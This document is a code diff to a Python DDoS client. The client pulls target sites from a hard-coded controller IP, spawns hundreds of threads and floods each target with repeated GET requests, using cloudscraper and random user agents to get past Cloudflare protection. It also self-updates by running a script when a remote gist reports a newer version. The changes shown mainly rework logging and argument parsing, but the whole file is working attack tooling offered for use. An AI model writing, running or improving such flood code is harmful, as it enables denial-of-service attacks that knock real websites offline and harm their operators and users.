@@ -1,21 +1,20 @@
-import cloudscraper
+import json
 import os
-from urllib.parse import unquote
+import platform
+from argparse import ArgumentParser
 from gc import collect
-from loguru import logger
 from os import system
+from random import choice
 from sys import stderr
 from threading import Thread
-from random import choice
 from time import sleep
-from urllib3 import disable_warnings
-from pyuseragents import random as random_useragent
-from argparse import ArgumentParser
-import platform
-from requests.exceptions import ConnectionError
+from urllib.parse import unquote
 
-import json
-import sys
+import cloudscraper
+from loguru import logger
+from pyuseragents import random as random_useragent
+from requests.exceptions import ConnectionError
+from urllib3 import disable_warnings
 
 VERSION = 7
 HOSTS = ["http://65.108.20.65"]
@@ -34,27 +33,32 @@ def clear():
         return system('cls')
 
 
-logger.remove()
-logger.add(
-    stderr, format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>")
-
-if len(sys.argv) > 1:
-    threads = int(sys.argv[1])
-else:
-    threads = 500
-
-
 parser = ArgumentParser()
-parser.add_argument("-v", "--verbose", dest="verbose", action='store_true')
+parser.add_argument('threads', nargs='?', default=500)
 parser.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
 parser.add_argument("-p", "--proxy-view", dest="proxy_view", action='store_true')
-parser.set_defaults(verbose=False)
+parser.add_argument("-lo", "--logger-output", dest="logger_output")
+parser.add_argument("-lr", "--logger-results", dest="logger_results")
 parser.set_defaults(no_clear=False)
 parser.set_defaults(proxy_view=False)
+parser.set_defaults(logger_output=stderr)
+parser.set_defaults(logger_results=stderr)
 args, unknown = parser.parse_known_args()
-verbose = args.verbose
 no_clear = args.no_clear
 proxy_view = args.proxy_view
+threads = int(args.threads)
+
+logger.remove()
+logger.add(
+    args.logger_output,
+    format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
+        <cyan>{line}</cyan> - <white>{message}</white>")
+logger.add(
+    args.logger_results,
+    format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
+        <cyan>{line}</cyan> - <white>{message}</white>",
+    level="SUCCESS")
+
 
 def checkReq():
     os.system("python3 -m pip install -r requirements.txt")
@@ -64,7 +68,7 @@ def checkReq():
 
 
 def checkUpdate():
-    print("Checking Updates...")
+    logger.info("Checking Updates...")
     updateScraper = cloudscraper.create_scraper(
         browser={'browser': 'firefox', 'platform': 'android', 'mobile': True},)
     url = "https://gist.githubusercontent.com/AlexTrushkovsky/041d6e2ee27472a69abcb1b2bf90ed4d/raw/nowarversion.json"
@@ -73,9 +77,9 @@ def checkUpdate():
         if content:
             data = json.loads(content)
             new_version = data["version"]
-            print(new_version)
+            logger.info("Version: ", new_version)
             if int(new_version) > int(VERSION):
-                print("New version Available")
+                logger.info("New version Available")
                 os.system("python updater.py " + str(threads))
                 os.system("python3 updater.py " + str(threads))
                 exit()
@@ -115,7 +119,7 @@ def mainth():
         else:
             sleep(5)
             continue
-        logger.info("STARTING ATTACK TO " + data['site']['page'])
+        logger.info("STARTING ATTACK ON " + data['site']['page'])
         site = unquote(data['site']['page'])
         if site.startswith('http') == False:
             site = "https://" + site
@@ -123,9 +127,6 @@ def mainth():
         attacks_number = 0
 
         try:
-            if not verbose:
-              print('Atacking', end ='')
-
             attack = scraper.get(site)
 
             if attack.status_code >= 302:
@@ -139,24 +140,18 @@ def mainth():
                         for i in range(MAX_REQUESTS):
                             response = scraper.get(site)
                             attacks_number += 1
-                            if verbose:
-                              logger.info("ATTACKED; RESPONSE CODE: " +
-                                          str(response.status_code))
-                            else:
-                              print('.', end ='')
+                            logger.info("ATTACKED; RESPONSE CODE: " +
+                                        str(response.status_code))
             else:
                 for i in range(MAX_REQUESTS):
                     response = scraper.get(site)
                     attacks_number += 1
-                    if verbose:
-                      logger.info("ATTACKED; RESPONSE CODE: " +
-                                  str(response.status_code))
-                    else:
-                      print('.', end ='')
+                    logger.info("ATTACKED; RESPONSE CODE: " +
+                                str(response.status_code))
             if attacks_number > 0:
-              logger.info("SUCCESSFUL ATTACKS: " + str(attacks_number))
+                logger.success("SUCCESSFUL ATTACKS on" + site + ": " + str(attacks_number))
         except ConnectionError as exc:
-            logger.info(f"Site is down: {exc}")
+            logger.success(f"{site} is down: {exc}")
         except Exception as exc:
             logger.warning(f"issue happened: {exc}, SUCCESSFUL ATTACKS: {attacks_number}")
             continue
@@ -168,13 +163,13 @@ def cleaner():
         checkUpdate()
 
         if not no_clear:
-          clear()
+            clear()
         collect()
 
 
 if __name__ == '__main__':
     if not no_clear:
-      clear()
+        clear()
     checkReq()
     checkUpdate()
     for _ in range(threads):
